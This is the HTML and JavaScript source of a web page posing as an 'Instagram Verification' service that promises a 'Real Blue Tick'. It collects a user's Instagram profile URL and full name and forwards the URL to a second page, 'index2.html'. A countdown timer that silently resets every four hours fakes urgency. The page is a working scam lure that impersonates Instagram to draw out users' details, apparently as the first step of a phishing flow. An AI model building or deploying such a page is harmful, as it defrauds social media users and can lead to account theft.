<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="icon" href="verify.png" type="image/x-icon">
    
    <style>
        /* Reset and Basic Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            overflow-x: hidden; /* Prevent horizontal scroll */
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
        }

        header {
            background-color: #fff;
            padding: 14px;
            text-align: center;
        }

        .logo img {
            height: 50px;
        }

        .banner {
            width: 100%;
            display: block;
            height: auto;
        }

        .timer-box {
            width: 100%;
            background-color: #e0f7fa;
            padding: 10px;
            text-align: center;
            margin-top: 10px;
            border-radius: 5px;
            font-size: 14px;
        }

        .timer {
            font-size: 28px;
            color: #ff0084;
        }

        .recharge-form {
            margin: 20px auto;
            background-color: #fff;
            padding: 30px;
            border-radius: 30px;
            box-shadow: 1px 2px 10px 10px rgb(16 0 191 / 10%);
            max-width: 600px;
        }

        .recharge-form h3 {
            font-size: 22px;
            color: #ff0084;
            margin-bottom: 15px;
        }

        .provider {
            display: flex;
            justify-content: space-between;
            margin: 10px 0;
        }

        .provider-option {
            flex: 1;
            margin: 0 5px;
            padding: 15px;
            text-align: center;
            border: 1px solid #ddd;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .provider-option.selected {
            background-color: #ff0084;
            color: white;
        }

        .recharge-form input[type="text"], 
        .recharge-form input[type="submit"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ff0084;
            border-radius: 5px;
        }

        .recharge-form input[type="submit"] {
            background: linear-gradient(179deg, #0064e0, #0064e0 );
            border: 2px solid #000000;
            color: white;
            border: none;
            cursor: pointer;
        }

        .photo-section {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            margin: 30px auto;
            max-width: 1200px;
        }

        .photo {
            width: calc(50% - 10px);
            max-width: 400px;
            height: auto;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .comments-section {
            width: 100%;
            max-width: 450px;
            margin: 20px auto;
            border: 1px solid #ddd;
            border-radius: 10px;
            padding: 10px;
        }

        .comment {
            display: flex;
            align-items: flex-start;
            padding: 10px 0;
            border-bottom: 1px solid #eee;
        }

        .comment:last-child {
            border-bottom: none;
        }

        .comment img {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            margin-right: 10px;
        }

        .comment-content {
            flex: 1;
        }

        .username {
            font-weight: bold;
            display: flex;
            align-items: center;
            font-size: 14px;
        }

        .verified-badge {
            width: 18px;
            height: auto;
            max-width: 18px; 
            max-height: 18px;
            margin-left: 4px;
            display: inline-block;
            vertical-align: middle;
        }

        .comment-text {
            font-size: 14px;
            margin: 3px 0;
        }

        .comment-details {
            font-size: 12px;
            color: gray;
        }

        .emoji-bar {
            display: flex;
            gap: 8px;
            margin-top: 10px;
            padding: 10px 0;
            border-top: 1px solid #ddd;
        }

        .emoji-bar span {
            cursor: pointer;
            font-size: 18px;
        }

        .add-comment {
            display: flex;
            align-items: center;
            padding: 10px;
            border-top: 1px solid #ddd;
        }

        .add-comment input {
            flex: 1;
            border: none;
            padding: 8px;
            outline: none;
            font-size: 14px;
        }

        .add-comment button {
            background: none;
            border: none;
            cursor: pointer;
            color: #007aff;
            font-weight: bold;
        }

        footer {
            text-align: center;
            padding: 20px 0;
        }

        footer img {
            width: 100%;
        }

        /* Mobile Responsive */
        @media screen and (max-width: 768px) {
            .photo {
                width: 100%;
            }
            
            .recharge-form {
                width: 90%;
            }
        }
        .header {
            background-color: #ffffff;
            padding: 1px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .menu-icon, .profile-icon {
            font-size: 20px;
            color: #ff0084;
        }
        
        .logo img {
            height: 55px;
            padding: 3px;
        }

        /* Offer section */
        .offer-section {
            text-align: center;
            padding: 1px;
        }

        .offer-section img {
            max-width: 100%;
            height: auto;
        }

        /* Popup background */
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        /* Popup Box */
        .popup {
            background: #ff69b4;
            color: white;
            padding: 20px;
            width: 320px;
            text-align: center;
            border-radius: 10px;
            position: relative;
            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.3);
            animation: fadeIn 0.5s ease-in-out;
        }

        /* Close Button */
        .close-btn {
            position: absolute;
            top: 10px;
            right: 15px;
            background: white;
            color: #ff69b4;
            border: none;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            padding: 5px 10px;
            border-radius: 50%;
        }

        .close-btn:hover {
            background: #ff1493;
            color: white;
        }

        /* Fade-in Animation */
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.8); }
            to { opacity: 1; transform: scale(1); }
        }

    </style>
    
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const form = document.querySelector('.recharge-form form');
    
            form.onsubmit = function(event) {
                event.preventDefault();
    
                const instagramURL = document.querySelector('#instagram').value;
    
                if (instagramURL) {
                    // Identify which button was clicked
                    const submitButton = event.submitter;
    
                    if (submitButton.value === "Get Real Blue Tick Now") {
                        window.location.href = `index2.html?url=${encodeURIComponent(instagramURL)}`;
                    } 
                }
            };
    
            // Timer setup for 4 hours countdown loop
            const duration = 4 * 60 * 60 * 1000; // 4 hours in milliseconds
            const display = document.querySelector('#time');
    
            let remaining = localStorage.getItem('remainingTime');
            
            if (!remaining) {
                remaining = duration; // Start with 4 hours if no saved time exists
            } else {
                remaining = parseInt(remaining);
            }
    
            function updateTimer() {
                if (remaining <= 0) {
                    remaining = duration; // Reset the timer to 4 hours when it reaches 0
                }
    
                let hours = String(Math.floor(remaining / (1000 * 60 * 60))).padStart(2, '0');
                let minutes = String(Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60))).padStart(2, '0');
                let seconds = String(Math.floor((remaining % (1000 * 60)) / 1000)).padStart(2, '0');
    
                display.textContent = `${hours}:${minutes}:${seconds}`;
    
                remaining -= 1000; // Decrease time by 1 second
                localStorage.setItem('remainingTime', remaining);
            }
    
            setInterval(updateTimer, 1000); // Update every second
        });
    </script>
</head>

<body>
    <header>
        <div class="header">
            <div class="logo"><img src="verify.png" alt="logo"></div>
            <div class="menu-icon"><i class="fas fa-bars"></i></div>
            <div class="profile-icon"><i class="fas fa-user-circle"></i></div>
        </div>
    </header>

    <div class="banner">
        <img src="banner.png" alt="banner">
    </div>

    <div class="timer-box">
        <p><strong>Time Left for Next Verification:</strong></p>
        <p class="timer" id="time">04:00:00</p>
    </div>

    <section class="recharge-form">
        <h3>Get Instagram Blue Tick</h3>
        <form>
            <label for="instagram">Instagram Profile URL or Username:</label>
            <input type="text" id="instagram" placeholder="https://www.instagram.com/yourprofile" required>

            <label for="name">Full Name:</label>
            <input type="text" id="name" placeholder="Enter your full name" required>

            <input type="submit" value="Get Real Blue Tick Now">
        </form>
    </section>

    <section class="photo-section">
        <img class="photo" src="photo1.jpg" alt="photo">
        <img class="photo" src="photo2.jpg" alt="photo">
    </section>

    <footer>
        <img src="footer-banner.png" alt="footer-banner">
    </footer>
</body>

</html>
